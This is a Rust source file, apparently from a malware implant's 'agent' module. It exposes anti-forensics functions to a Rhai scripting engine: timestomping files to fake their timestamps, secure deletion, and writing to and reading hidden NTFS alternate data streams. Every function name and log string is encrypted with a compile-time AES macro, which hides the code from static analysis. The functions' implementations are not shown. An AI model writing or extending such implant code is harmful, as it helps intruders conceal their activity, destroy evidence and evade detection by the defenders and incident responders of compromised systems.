// src/agent/scripting/artifacts.rs
use rhai::Engine;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {
    engine.register_fn(&aes_str!("timestomp"), |target: &str, reference: &str| -> String {
        match crate::agent::artifacts::timestomp_copy(target, reference) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("timestomp_epoch"), |path: &str, epoch: i64| -> String {
        match crate::agent::artifacts::timestomp_epoch(path, epoch) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("secure_delete"), |path: &str| -> String {
        match crate::agent::artifacts::secure_delete(path) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("ads_write"), |path: &str, stream: &str, data: &str| -> String {
        match crate::agent::artifacts::ads_write(path, stream, data.as_bytes()) {
            Ok(m)  => m,
            Err(e) => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("ads_read"), |path: &str, stream: &str| -> String {
        match crate::agent::artifacts::ads_read(path, stream) {
            Ok(d)  => String::from_utf8_lossy(&d).to_string(),
            Err(e) => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("ads_list"), |path: &str| -> String {
        match crate::agent::artifacts::ads_list(path) {
            Ok(streams) => streams.join("\n"),
            Err(e)      => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("print_log"), |msg: &str| {
        eprintln!("{}{}", aes_str!("[Ext Log] "), msg);
    });
}